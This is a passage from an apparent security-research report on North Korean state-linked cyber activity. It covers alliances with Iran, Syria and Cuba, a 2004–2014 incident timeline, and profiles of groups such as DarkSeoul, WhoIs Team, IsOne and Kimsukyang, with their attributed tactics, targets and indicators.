http://thediplomat.com/2013/10/the-iran-secret-explaining-north-koreas-rocket-success/2/
259
http://humanities.tau.ac.il/iranian/en/previous-reviews/10-iran-pulse-en/117-10
260
http://www.armscontrol.org/factsheets/dprkchron
261
http://www.irantracker.org/foreign-relations/north-korea-iran-foreign-relations
include IT information sharing , engineering , biotechnology , renewable energy , and sustainability .
F - Secure ’s Mikko Hypponen stated , " It 's highly likely that one of the reasons for this co - operation
is for them to work together regarding their cyber defence and cyber offense strategies " .
Hypponen cited Flame malware as a possible triggering event for the creation of this treaty .
Others also suspect that Iran and North Korea ’s mutual interest in development of nuclear
weapons and the need to protect refineries against malware such as Stuxnet were driving factors
in the establishment of the treaty.262 U.S. House Foreign Affairs Committee leaders assert that the
treaty indicates North Korea and Iran are collaborating on a joint nuclear weapons program.263
Additionally , North Korea , in conjunction with Iran and Syria , reportedly supports both Hamas and
Hezbollah in procuring kinetic weaponry and communications equipment and in establishing
operational infrastructure.264 265 266
Syria
North Korea has both a cyber relationship and kinetic weapons ties with Syria . KCC reportedly has
a branch in Syria.267
In 2007 , Israel launched an airstrike , destroying a Syrian target that was allegedly a nuclear facility
under construction with North Korea ’s assistance . U.S. officials noted the facility was modeled on
the North Korean nuclear reactor at Yongbyon.268
The North Korea - Syria relationship becomes more important in the context of both countries’ ties
with Iran . As noted above , Iran , North Korea , and Syria jointly provide support to extremist groups
Hamas and Hezbollah.269 270 271 Additionally , as we explored in HPSR Security Briefing Episode 11 ,
Iran and Syria ’s military alliances extend to joint SIGINT and cyber operations.272
Cuba
North Korea also has an interesting relationship with Cuba – one that includes supplying weapons
and apparent attempts to illegally smuggle weapons . In 2013 , a North Korean cargo ship on its
return voyage was stopped near the Panama Canal . The ship was carrying surface - to - air missile
parts , disguised as containers of sugar . In an attempt to save face , Cuba ’s Ministry of Foreign
Affairs stated that the cargo included " 240 metric tons of obsolete defensive weapons -- two anti-
aircraft missile complexes Volga and Pechora , nine missiles in parts and spares , two Mig-21 Bis
and 15 motors for this type of airplane , all of it manufactured in the mid-20th century -- to be
262
http://www.v3.co.uk/v3-uk/news/2202493/iran-and-north-korea-sign-technology-treaty-to-combat-hostile-malware
263
http://www.voanews.com/content/ties-among-north-korea-syria-iran-a-major-security-threat/1639769.html
264
http://38north.org/2014/08/aberger080514/?utm_source = feedburner&utm_medium = feed&utm_campaign = Feed%3A+38North+%2838+North%3A+
Informed+Analysis+of+North+Korea%29
265
http://www.jewishjournal.com/opinion/article/hamas_global_support_network_must_be_targeted
266
http://www.ibtimes.com/north-korea-send-hamas-weapons-communication-equipment-secret-arms-deal-1640088
267
http://www.naenara.com.kp/en/kcc/
268
http://www.armscontrol.org/factsheets/dprkchron
269
http://38north.org/2014/08/aberger080514/?utm_source = feedburner&utm_medium = feed&utm_campaign = Feed%3A+38North+%2838+North%3A+
Informed+Analysis+of+North+Korea%29
270
http://www.jewishjournal.com/opinion/article/hamas_global_support_network_must_be_targeted
271
http://www.ibtimes.com/north-korea-send-hamas-weapons-communication-equipment-secret-arms-deal-1640088
272
http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/HPSR-Threat-Intelligence-Briefing-Episode-11/ba-p/6385243#.U_TiZGSwL-0
repaired and returned to Cuba . " Experts said the cargo appeared to include a SNR-75 Fan Song
fire - control radar system for an SA-2 missile , a Soviet - era missile system that was also used in
Cuba.273 Following the incident , Fidel Castro credited former North Korean leader Kim Il - Sung for
providing Cuba with weapons near the end of the Cold War . Weapons included 100,000 AK rifles
and necessary ammunition.274
While no apparent cyber relationship exists between North Korea and Cuba at this time , their track
record for weapons trade means the potential for future collaboration in the cyber realm can not
be discounted .
Timeline of significant North Korean cyber activity
2004
        North Korea gains access to 33 South Korean military wireless communication
networks275
2006
        The U.S. State Department is attacked by entities in the East Asia - Pacific region . The
attacks coincided with State Department negotiations with North Korea regarding the
regime ’s nuclear missile tests . ( June)276
     A South Korean military official states North Korea ’s Unit 121 has breached South Korean
and U.S. military entities . ( July)277
2007
        North Korea tests a logic bomb ( October)278
2009
        North Korea states that it is “ fully ready for any form of high - tech war . ” ( June)279
        DarkSeoul DDoS and disk wiping malware targeting South Korean and U.S. government ,
media outlet , and financial websites . These attacks also coincided with U.S. Independence
Day . ( July)280 281
        Malware for “ Operation Troy ” was likely planted.282
2010
        DarkSeoul Backdoor . Prioxer detected ( June ) 283
        Korean Central News Agency website becomes North Korea ’s first known direct
connection to the Internet ( October)284
273
http://www.nbcnews.com/news/other/north-korean-ship-carrying-hidden-missile-equipment-detained-after-leaving-f6C10647045
274
http://www.abc.net.au/news/2013-08-15/fidel-castro-cuba-north-korea-war-ussr/4887920
275
http://www.scribd.com/doc/15078953/Cyber-Threat-Posed-by-North-Korea-and-China-to-South-Korea-and-US-Forces-Korea
276
http://www.informationweek.com/state-department-releases-details-of-computer-system-attacks/d/d-id/1045112 ?
277
http://www.scribd.com/doc/15078953/Cyber-Threat-Posed-by-North-Korea-and-China-to-South-Korea-and-US-Forces-Korea
278
http://www.scribd.com/doc/15078953/Cyber-Threat-Posed-by-North-Korea-and-China-to-South-Korea-and-US-Forces-Korea
279
http://www.huffingtonpost.com/2009/07/11/north-korea-army-lab-110-_n_229986.html
280
http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
281
http://powerofcommunity.net/poc2009/si.pdf
282
http://www.darkreading.com/attacks-and-breaches/south-korean-bank-hackers-target-us-military-secrets/d/d-id/1110674 ?
283
http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
284
http://www.northkoreatech.org/2010/10/09/the-new-face-of-kcna/
2011
        “ 10 Days of Rain ” Attack - DarkSeoul DDoS and disk wiping malware against South Korean
media , financial , and critical infrastructure targets ( March)285 286
        North Korea disrupts South Korean GPS signals ( March)287
        North Korea reportedly attempts DDoS attack against Incheon Airport 288
        Nonghyup bank suffers DDoS attack ( April)289
2012
        South Korean newspaper JoongAng Ilbo attacked ( June)290
        DarkSeoul Downloader . Castov detected ( October)291
        North Korea signs treaty with Iran , agreeing to combat “ common enemies ” in
cyberspace292
2013
        “ March 20 ” disk wiping attacks against South Korean media and financial institutions
( March)293
     Whois Team claims responsibility for attacking LG + U website with wiper malware and
defacement , impacting South Korean media and financial institutions ( March ) 294 295
     The New Romantic Cyber Army Team claims responsibility for the same attacks296
     North Korea experiences 36-hour Internet outage . The cause was never definitively
determined297
     Anonymous launches # OpNorthKorea and targets North Korean websites ( March)298
     Anonymous allegedly hacks Uriminzokkiri and takes over its Twitter and Flickr pages 299
( April )
     DarkSeoul attack on South Korean financial institutions ( May)300
     DarkSeoul DDoS attacks against South Korean government ’s DNS server ( June)301
     Details on Kimsuky malware , which targeted South Korean think tanks , first released
( September)302
2014
        North Korean drones found near South Korean border ( March and April)303
285
http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
286
https://docs.google.com/file/d/0B6CK-ZBGuMe4dGVHdTZnenJMRUk/preview?pli=1
287
http://www.reuters.com/article/2011/05/03/us-korea-north-cyber-idUSTRE7421Q520110503
288
http://threatpost.com/report-north-korea-accused-ddos-attack-south-korean-airport-060712/76664
289
http://koreajoongangdaily.joins.com/news/article/article.aspx?aid=2965629
290
http://www.theaustralian.com.au / news / latest - news / south - korean - newspaper - joongang - ilbo - hit - by - major - cyber - attack / story - fn3dxix6-
1226391202749
291
http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
292
http://www.v3.co.uk/v3-uk/news/2202493/iran-and-north-korea-sign-technology-treaty-to-combat-hostile-malware
293
http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
294
http://www.zdnet.com/massive-attack-on-lg-uplus-sparks-n-korea-reprisal-fears-7000012881/
295
http://www.theregister.co.uk/Print/2013/03/22/sk_megahack/
296
http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/2
297
http://www.computerworld.com/s/article/9237652/North_Korea_39_s_Internet_returns_after_36_hour_outage
298
http://www.northkoreatech.org/2013/03/30/tango-down-more-attacks-on-dprk-websites/
299
http://www.washingtontimes.com/news/2013/apr/4/anonymous-hackers-bring-down-north-korean-websites/
300
http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
301
http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
302
http://www.securelist.com/en/analysis/204792305/The_Kimsuky_Operation_A_North_Korean_APT
303
http://blogs.wsj.com/korearealtime/2014/04/02/seoul-points-to-north-korea-in-crashed-drones-investigation/
Patterns in the noise : cyber incidents attributed to North Korean actors
It is interesting to note that much of North Korea ’s cyber activity follows a distinct pattern .
Analysis of North Korean cyber activity gives insight into these patterns and also helps tie
together North Korea ’s strategic , tactical , and operational capabilities . Strategic capabilities refer
to the assets used in support of a long - term , overarching goal . Tactical capabilities refer to the
methods and maneuvers actually implemented in pursuit of the strategic goal.304 Operational
capabilities refer to the potential use of these capabilities.305
In 2004 , in response to the annual U.S. – South Korea joint military exercises , North Korea
reportedly gained access to 33 South Korean military wireless communication networks.306 The
next significant cyber attack attributed to North Korea was in June 2006 . The U.S. State
Department was attacked by entities in the East Asia - Pacific region . The attacks coincided with
State Department negotiations with North Korea regarding the regime ’s nuclear missile tests . 307
In July 2006 , North Korea ’s Unit 121 reportedly breached South Korean and U.S. military
entities.308 This attack was concurrent with the regime ’s test - fire of at least one long - range
missile and several medium - range missiles.309
2007 was politically tumultuous for North Korea . Following multi - national talks , the UN ’s
International Atomic Energy Agency ( IAEA ) ordered the shutdown of the regime ’s nuclear facilities
in Yongbyon in July.310 Its nuclear efforts temporarily thwarted , North Korea tested a logic bomb
in October 2007.311
In April 2009 , North Korea ejected IAEA and U.S. nuclear compliance officials . The regime indicated
refusal to comply with any UN agreements regarding nuclear weaponry and announced it would
reinstate its nuclear materials production . The next month , North Korea conducted an
underground nuclear test and voiced its confidence that the regime was well on its way to
producing viable nuclear technology . The UN called an emergency meeting condemning the
nuclear weapons test , and South Korea joined the Proliferation Security Initiative ( PSI ) . North
Korea issued a statement via KCNA calling South Korea ’s involvement in PSI an act of war.312 In
June 2009 , North Korea stated that it was “ fully ready for any form of high - tech war.”313 The
following month , DDoS and disk wiping malware , later known as DarkSeoul , targeted South
Korean and U.S. government entities , media outlets , and financial websites . The attacks coincided
304
http://www.scholastic.com/teachers/article/strategy-and-tactics-military
305
http://www.dau.mil/pubscats/Pages/preface.aspx
306
http://www.scribd.com/doc/15078953/Cyber-Threat-Posed-by-North-Korea-and-China-to-South-Korea-and-US-Forces-Korea
307
http://www.informationweek.com/state-department-releases-details-of-computer-system-attacks/d/d-id/1045112 ?
308
http://www.scribd.com/doc/15078953/Cyber-Threat-Posed-by-North-Korea-and-China-to-South-Korea-and-US-Forces-Korea
309
https://www.google.com / url?sa = t&rct = j&q=&esrc = s&source = web&cd=2&ved=0CCMQFjAB&url = http%3A%2F%2Fwww.bbc.com%2Fnews%2Fworld-
asia - pacific-
15278612&ei = fabyU6XQLsLFigLH94GIAw&usg = AFQjCNGbrzkNZJ5tz4jmLyMPsCHEHc41WA&sig2=l8FMAdbvzFxYeBBOAMWO6Q&bvm = bv.73231344,d
.cGE&cad = rja
310
http://www.armscontrol.org/factsheets/dprkchron
311
http://www.scribd.com/doc/15078953/Cyber-Threat-Posed-by-North-Korea-and-China-to-South-Korea-and-US-Forces-Korea
312
http://www.armscontrol.org/factsheets/dprkchron
313
http://www.huffingtonpost.com/2009/07/11/north-korea-army-lab-110-_n_229986.html
with U.S. Independence Day.314 315 Other malware used for Operation Troy was also planted .
Operation Troy would continue for several years , largely undetected.316
In early 2011 , political and military tensions were high . In February , James Clapper , United States
Director of National Intelligence , testified that North Korea likely had undeclared uranium
enrichment facilities as part of its nuclear weapons program.317 In March 2011 , South Korean
media , financial , and critical infrastructure targets suffered a DDoS and disk - wiping malware
attack later known as the “ 10 Days of Rain ” . U.S. and South Korean military entities were also
targeted by DDoS during this attack . The attack used the DarkSeoul malware.318 North Korea also
disrupted South Korean GPS signals . Additionally , North Korean actors reportedly attempted a
DDoS attack against South Korea ’s Incheon Airport that same month.319 These incidents coincided
with the annual U.S. – South Korea joint military exercises.320 The following month , North Korean
actors reportedly launched a DDoS attack against South Korea ’s Nonghyup bank.321
In 2012 , an attack on South Korean Newspaper JoongAng Ilbo was attributed to North Korean
actors . This attack also coincided with the timing of the annual joint U.S. – South Korea military
exercises.322 In September 2012 , North Korea signed a cyber treaty with Iran , agreeing the two
nations would collaborate to combat “ common enemies ” in cyberspace.323
The week of March 11 , 2013 , the U.S. and South Korea began their annual joint military exercise
near the Korean Peninsula . Like clockwork , attacks attributed to North Korea and now known as
the March 20 attacks targeted three South Korean media outlets and Shinhan , Nonghyup , and Jeju
banks . North Korea also exhibited other hostile activity at that time . North Korea cut
communication with Seoul and announced it had scrapped the 1953 armistice between the two
Koreas . North Korea ’s foreign ministry also issued a statement that it perceived this exercise as a
precursor to invasion and that the regime would respond with a “ strong military counteraction ” if
the situation escalated.324 That same week , the North Korean military conducted a drone attack
simulation.325
On March 18 , the Uriminzokkiri YouTube channel posted an anti - U.S. video entitled “ Firestorms
Will Rain on the Headquarters of War ” that showed a depiction of the White House in crosshairs ,
followed by an explosion.326
314
http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
315
http://powerofcommunity.net/poc2009/si.pdf
316
http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
317
http://www.armscontrol.org/factsheets/dprkchron
318
http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
319
http://threatpost.com/report-north-korea-accused-ddos-attack-south-korean-airport-060712/76664
320
http://www.reuters.com/article/2011/05/03/us-korea-north-cyber-idUSTRE7421Q520110503
321
http://koreajoongangdaily.joins.com/news/article/article.aspx?aid=2965629
322
http://www.theaustralian.com.au / news / latest - news / south - korean - newspaper - joongang - ilbo - hit - by - major - cyber - attack / story - fn3dxix6-
1226391202749
323
http://www.v3.co.uk/v3-uk/news/2202493/iran-and-north-korea-sign-technology-treaty-to-combat-hostile-malware
324
http://www.presstv.com/detail/2013/03/20/294499/north-korea-threatens-us-over-bombers/
325
http://www.huffingtonpost.com/2013/03/20/north-koreas-drone_n_2914794.html
326
https://www.youtube.com/watch?v=Dyap eCiOl9A
Figure 25 Uriminzokkiri YouTube video portraying anti - U.S. sentiments . 327
In May 2013 , DarkSeoul malware was used to attack several South Korean financial institutions ;
and in June , DarkSeoul DDoS attacks were launched against the South Korean government ’s DNS
server . The latter took place on June 25 , the anniversary of the start of the Korean War.328
As evidenced above , much of North Korea ’s cyber activity coincides with the annual U.S. – South
Korea joint military exercises . Attacks not following that pattern were typically in response to
political events impacting the regime or correlated with significant dates , such as the anniversary
of the start of the Korean War . The regime ’s strategic assets and tactical capabilities in the cyber
arena seem to have evolved only slightly since 2009 . Most of the attacks attributed to North
Korea employ limited tactics , and their operational capability demonstrates an increase in the
frequency and volume of attacks but is otherwise unimpressive to date .
In June 2014 , the regime demanded cancellation of the annual U.S. - South Korea joint military
exercise , attempting to use participation in the upcoming Asian Games as a bargaining chip.329 The
regime ’s demands may have had other political motivations , as they preceded the July 2014
meeting between South Korean president Park and Chinese President Xi Jinping . The meeting
327
https://www.youtube.com/watch?v=DyapeCiOl9A
328
http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
329
http://www.theguardian.com/world/2014/jun/30/north-korea-demands-cancellation-drills
centered on trade and regional security issues , including the ever - present rhetoric around
denuclearization of North Korea.330 Both leaders were critical of Japan ’s recent announcement to
soften sanctions on North Korea.331 As this report headed to press , the annual U.S. – South Korea
joint military exercises were underway.332
DarkSeoul
The most prominent North Korean threat actor group is the group responsible for the DarkSeoul
malware . According to statements from the South Korean government , North Korea ’s Lab 110
were the actors behind the DarkSeoul malware . South Korean intelligence reports
According to statements
stated that Lab 110 , which is affiliated with the regime ’s defense ministry , was        from the South Korean
ordered by the North Korean regime to destroy South Korean communications               government , North
networks.333 Although the March 20 attacks used DarkSeoul malware , it is interesting    Korea ’s Lab 110 were the
to note that two groups , WhoIs Team and New Romantic Cyber Army Team , claimed           actors behind the
DarkSeoul malware
responsibility for the “ March 20 ” 2013 attacks on South Korean media and financial
attacks .
institutions.334
Some of the DarkSeoul attacks corresponded with significant dates , such as U.S. Independence
Day or the anniversary of the start of the Korean War . DarkSeoul attacks go beyond denial of
service and sabotage . As early as 2009 , the group responsible for the Dark Seoul attacks
launched “ Operation Troy ” , an espionage campaign targeting the South Korean military . The
operation was codenamed “ Troy ” due to the frequent use of the word “ Troy ” in the malware ’s
compile path strings.335 The malware used in these attacks sought out and exfiltrated data , based
on keyword searches . While the malware was clearly intended to search for and exfiltrate certain
types of data , its true impact on the targets was never revealed . 336 The March 2011 “ 10 Days of
Rain ” DDoS attacks on U.S. and South Korean sites have also been attributed to the actors
associated with DarkSeoul.337 According to Symantec , the politically motivated attacks have
required a level of intelligence , coordination , monetary support , and technical sophistication that
suggests state sponsorship.338 This designation means the group can be considered an advanced
persistent threat ( APT ) .
A March 20 , 2013 attack attributed to the DarkSeoul actors targeted three South Korean media
outlets and Shinhan , Nonghyup , and Jeju banks . The impact of the March 20 attacks included
disruption of service at financial institutions and data deletion . However , the targeted entities
resumed normal operations shortly thereafter.339 According to South Korean reports , the media
outlets targeted corresponded with those listed by the North Korean regime in 2012 as right - wing
press that manipulated South Korea ’s public opinion . In April 2012 , the regime reportedly listed
330
http://edition.cnn.com/2014/07/02/world/asia/south-korea-xi-visit/index.html?hpt=hp_bn7
331
http://mobile.nytimes.com/blogs/sinosphere/2014/07/07/q-and-a-john-delury-on-chinese-south-korean-ties/?smid=tw-share
332
http://www.globalpost.com/dispatch/news/yonhap-news-agency/140825/n-korea-urges-un-action-against-s-korea-us-military-drill
333
http://www.theguardian.com/world/2009/jul/11/south-korea-blames-north-korea-cyber-attacks
334
http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/2
335
http://www.darkreading.com/attacks-and-breaches/south-korean-bank-hackers-target-us-military-secrets/d/d-id/1110674 ?
336
http://motherboard.vice.com/blog/the-dark-seoul-hackers-were-after-south-korean-military-secrets
337
http://blogs.mcafee.com/wp-content/uploads/2011/07/McAfee-Labs-10-Days-of-Rain-July-2011.pdf
338
http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
339
http://www.nytimes.com/2013/03/21/world/asia/south-korea-computer-network-crashes.html?pagewanted=all&_r=1 &
those entities as attack targets.340 The malware used in the March 20 , 2013 attacks were wiper
malware . The malware attempted to disable AhnLab and Hauri AV antivirus products then
proceeded to overwrite the master boot record ( MBR ) . The attack was capable of wiping both
Linux and Windows machines.341 McAfee found that these attacks were the culmination of the
malware campaign they dubbed “ Operation Troy”.342
A report from IssueMakersLab tied the actors responsible for the March 20 , 2013 attacks to cyber
attack activity occurring as early as 2007 . IssueMakersLab found that these actors consistently
used the same 16-digit password for file compression , the same stage 1 C2 protocol , the same
collection keywords and encryption keys , and the same development path.343 According to South
Korea ’s Korea Internet and Security Agency , the North Korean IP address 175.45.178.xx was
found scanning South Korean routes the month before the attacks,344 and the same IP was
reportedly logged as accessing one of the targets 13 times.345 Details of the March 20 attack also
suggested possible ties to China . AlienVault suspected the Chinese exploit kit GonDad was used to
spread the malware , and the Korean domains serving the malware were registered using a
Chinese email address . Additionally , researchers at AhnLab in South Korea noted a Chinese IP
address linked to the attacks.346
While no concrete evidence has been released that indicates Lab 110 was responsible for the
DarkSeoul attacks , the responsible group ’s targets , TTP , and attack timing demonstrate a strong
pro - North Korean sentiment .
Known tactics , techniques and procedures
 Customized wiper malware347
 DDoS
 Multi - staged , coordinated attacks348
 Destructive payloads with politically significant trigger dates
 Use of politically themed strings when overwriting disk sectors
 Utilizing legitimate patching mechanisms to spread malware across corporate networks
 Encryption and obfuscation methods that have become their signature
 Repeated use of a specific webmail server
 Consistent C2 structures
 Antivirus disablement and evasion349
 Watering hole attacks
 Zero - days
 Spearphishing350
340
http://english.yonhapnews.co.kr/northkorea/2013/03/21/71/0401000000AEN20130321006700315F.HTML
341
http://www.theregister.co.uk/Print/2013/03/22/sk_megahack/
342
http://www.darkreading.com/attacks-and-breaches/south-korean-bank-hackers-target-us-military-secrets/d/d-id/1110674 ?
343
https://docs.google.com/file/d/0B6CK-ZBGuMe4dGVHdTZnenJMRUk/preview?pli=1
344
http://english.yonhapnews.co.kr/national/2013/04/11/79/0301000000AEN20130411008351320F.HTML
345
http://www.darkreading.com/attacks-and-breaches/how-south-korea-traced-hacker-to-pyongyang/d/d-id/1109491 ?
346
http://www.theregister.co.uk/Print/2013/03/22/sk_megahack/
347
http://news.sky.com/story/1108704/darkseoul-gang-behind-years-of-korea-hacking
348
http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
349
http://www.theregister.co.uk/Print/2013/03/22/sk_megahack/
350
http://www.infoworld.com/t/data-security/mcafee-uncovers-massive-cyber-espionage-campaign-against-south-korea-222245
Targets
     South Korean military
     U.S. sites
     Shinhan Bank
     Nonghyup Bank351
     Jeju Bank352
     Munhwa Broadcasting Corp.
     YTN
     Korea Broadcasting System353
     South Korean government DNS server
     South Korea financial institutions
WhoIs Team
WhoIs Team is one of two groups that claimed responsibility for the “ March 20 ” attacks targeting
South Korea . A defacement on the LG + U webpage stated that it was “ Hacked by WhoIs Team ”
and that the attackers would return . The page featured three skulls.354 However , no other attacks
by WhoIs Team have been observed .
351
http://www.reuters.com/article/2011/05/03/us-korea-north-cyber-idUSTRE7421Q520110503
352
http://www.nytimes.com/2013/03/21/world/asia/south-korea-computer-network-crashes.html?pagewanted=all&_r=1 &
353
http://www.businessweek.com/news/2013-03-20/s-dot-korea-hit-by-cyber-attack-roiling-banks-to-broadcasters
354
http://www.zdnet.com/massive-attack-on-lg-uplus-sparks-n-korea-reprisal-fears-7000012881/
Figure 26 A defacement by “ WhoIs Team ” 355
Known tactics , techniques , and procedures
 Wiper malware356
 Defacements
Targets
     Took credit for an attack on the LG + U website .
355
http://nakedsecurity.sophos.com/2013/03/20/south-korea-cyber-attack/
356
http://www.mcafee.com/sg/resources/white-papers/wp-dissecting-operation-troy.pdf
Associated actors
 dbM4st3r
 d3sign3r
 APTM4st3r
 s3ll3r
 vacc1nm45t3r
 r3cycl3r
Based on North Korea ’s affinity for disinformation and counterintelligence , we must note the
distinct possibility that operatives claiming to be WhoIs Team are part of another group and that
the defacement was a false flag operation meant to pin blame on RAON_ASRT . RAON_ASRT is a
South Korean white hat capture the flag ( CTF ) team , whose members also operate under the
name “ WhoIs”.357
l
Figure 27 A screenshot showing that South Korea ’s RAON_ASRT white hat CTF team also uses the
moniker WhoIs.358
RAON_ASRT ( the RaonSecure Advanced Security Research Team ) and its sub - teams WhoIs Team
and Cpark Team359 have participated in and performed well in CTF contests such as the one
hosted by DefCon . 360 In 2013 , a member of RAON_ASRT was invited to Blue House , the residence
of the South Korean president , to meet with president Park and discuss the security industry.361
RAON_ASRT runs the Secuinside CTF competition.362 Their parent organization RaonSecure
operates a whitehat training program.363 The group also runs the Korea WhiteHat Contest , which
is hosted by South Korea ’s Ministry of National Defense and National Intelligence Service and
357
https://ctftime.org/team/3206
358
https://ctftime.org/team/3206
359
http://ls-al.org/asrt-has-become-the-winner-of-codegate-2013/
360
http://blog.raonsecure.com/62
361
http://ls-al.org/asrt-researcher-meets-the-president-park-in-korea/
362
http://ls-al.org/asrt-runs-secuinside-ctf/
363
http://www.whitehat.co.kr/
supervised by South Korean Cyber Command.364 For these reasons , it seems unlikely that the
RAON_ASRT WhoIs Team would maliciously target South Korean entities .
IsOne
IsOne is the group that claimed responsibility for the June 2012 attack on the website of South
Korean newspaper JoongAng Ilbo . The attack included an attempt to wipe JoongAng Ilbo ’s servers
as well as a defacement depicting a laughing cat . Despite efforts to wipe the target ’s servers , the
target only suffered defacement and temporary downtime.365
Figure 28 Defacement by “ IsOne ” . 366
Although the groups have a similar name and both use a cat theme , it is unclear whether a CTF
team known as “ The Cat is Number 1 ” and IsOne are the same actors . “ The Cat is Number 1 ”
members claim to hail from North Korea , but there is no hard evidence linking team members to
364
http://ls - al.org/%EB%8C%80%ED%95%9C%EB%AF%BC%EA%B5%AD-%ED%99%94%EC%9D%B4%ED%8A%B8%ED%96%87-
% EC%BD%98%ED%85%8C%EC%8A%A4%ED%8A%B8korea - whitehat - contest-%EA%B0%9C%EC%B5%9C/
365
http://koreajoongangdaily.joins.com/news/article/article.aspx?aid=2965629
366
http://bad-bytes.blogspot.co.uk/2012/06/joongang-ilbo-cyber-attack.html
the region.367 Again , it seems that the actors responsible for the attack borrowed the moniker of
another group .
Figure 29 A screenshot of “ The Cat is Number One ” profile on CTF Time 368
According to South Korea ’s National Police Agency , the attack on JoongAng Ilbo shares
characteristics with previous attacks attributed to North Korean actors . An investigation
conducted by the agency ’s Cyber Terror Response Center found that the actors targeting
JoongAng Ilbo used two North Korean servers and 17 servers in 10 other countries . One server
maintained a constant connection to an IP address belonging to Joson Telecommunication
Company , which is affiliated with North Korea ’s Ministry of Posts and Telecommunications .
Investigators found that one of the servers used in the attack on JoongAng Ilbo was also used in
the March 2011 DDoS attacks on South Korean critical infrastructure sites and the April 2011
attack on Nyongyup Bank.369
Known tactics , techniques and procedures
 Wiper malware
 Defacements
Targets
      Took credit for defacing JoongAng Ilbo .
367
https://ctftime.org/team/2538
368
https://ctftime.org/team/2538
369
http://koreajoongangdaily.joins.com/news/article/article.aspx?aid=2965629
Kimsukyang
The Kimsuky malware , which targeted South Korean think tanks , is loosely attributed to an actor
referred to as Kimsukyang . Little is known about the actor or group responsible for the malware .
However , the following email addresses are associated with the Kimsuky operation:370
     beautifl@mail.bg
     ennemyman@mail.bg
     fasionman@mail.bg
     happylove@mail.bg
     lovest000@mail.bg
     monneyman@mail.bg
     sportsman@mail.bg
     veryhappy@mail.bg
     iop110112@hotmail.com
     rsh1213@hotmail.com
The email address iop110112@hotmail.com was registered using the alias “ kimsukyang ” , and
rsh1213@hotmail.com was registered using the alias “ Kim asdfa ” .
Kaspersky found that the Kimsuky operation used 10 IP addresses in two Chinese provinces that
border North Korea : Jilin and Liaoning.371
Known tactics , techniques and procedures
 Malware with keylogger and data exfiltration capabilities
 Malware disables AhnLab security software372
Targets
     Sejong Institute
     Korea Institute for Defense Analyses ( KIDA )
     Ministry of Unification
     Hyundai Merchant Marine
     The Supporters of Korean Unification373
New Romantic Cyber Army Team / Hastati
The New Romantic Cyber Army Team also took credit for the March 20 , 2013 attacks . McAfee
suspected New Romantic Cyber Army Team were responsible for Operation Troy and the resulting
March 20 , 2013 attacks due to the group ’s “ frequent use of Roman and classical terms in their
370
http://www.securelist.com/en/analysis/204792305/The_Kimsuky_Operation_A_North_Korean_APT
371
http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/5
372
http://www.securelist.com/en/analysis/204792305/The_Kimsuky_Operation_A_North_Korean_APT
373
http://www.securelist.com/en/analysis/204792305/The_Kimsuky_Operation_A_North_Korean_APT
code.”374 It is unknown whether Hastati is an alternate name for the group or whether Hastati is
an individual actor within the group .
It is interesting to note that the malware associated with these actors uses the strings “ HASTATI ”
and “ PRINCIPES ” to overwrite the MBR . The name Hastati likely refers to a class of infantrymen of
the early Roman Republic . The Hastati were less experienced soldiers who fought on the
frontlines with spears and swords . Principes likely refers to more experienced Roman soldiers
who fought on the second line of battle . 375
Figure 30 Defacement by Hastati.376
Known tactics , techniques and procedures
 Wiper malware
Targets
     KBS TV377
     Entities targeted in Operation Troy378
Malware summary
HP researchers had previously analyzed samples of the DarkSeoul dropper , and findings were
published in our annual HP Cyber Risk Report 2013 . Analysis of this malware is included in
Appendix C. Analysis of additional malware used in these campaigns produced no new findings
and only corroborated what was found by external security researchers . These publicly available
analyses have been cited throughout the report . Some of the malware samples were no longer
publicly available . However , CrowdStrike obtained these missing samples before they
disappeared from the wild and conducted thorough analysis , which was released in their
subscription - only reports . While we can not divulge detailed information from those reports , an
overview of the findings is provided below .
374
http://www.darkreading.com/attacks-and-breaches/south-korean-bank-hackers-target-us-military-secrets/d/d-id/1110674 ?
375
http://www.roman-empire.net/army/army.html#earlylegion
376
http://eromang.zataz.com/2013/04/02/dark-south-korea-total-war-review/
377
http://eromang.zataz.com/2013/04/02/dark-south-korea-total-war-review/
378
http://www.mcafee.com/us/resources/white-papers/wp-dissecting-operation-troy.pdf
The majority of the malware used in cyber incidents attributed to North Korea were variations of
three types of malware : dropper , wiper , and IRC remote access trojan ( RAT ) . CrowdStrike ’s
attribution of this malware to North Korean actors stemmed from two primary factors : Korean
language characters found in the binaries and the propensity to specifically target South Korean
entities.379
Dropper samples consistently targeted AhnLab Policy Center as a propagation method . This
information is corroborated in a Black Hat Asia 2014 presentation by Fortinet researcher Kyle
Yang.380 CrowdStrike ’s report also briefly noted the use of an update server vector.381 Yang
analyzed the malware 's update config metadata and matched its format to the AhnLab Policy
Center . To test its payload , Yang set up a server / client and executed the update through the
server . As Yang had predicted , it wiped the client.382 While the method for initial compromise of
the update server is not noted in detail , CrowdStrike ’s report cites “ collateral information ” that
suggests targeted email attacks were used to gain initial entry , and policy servers were then
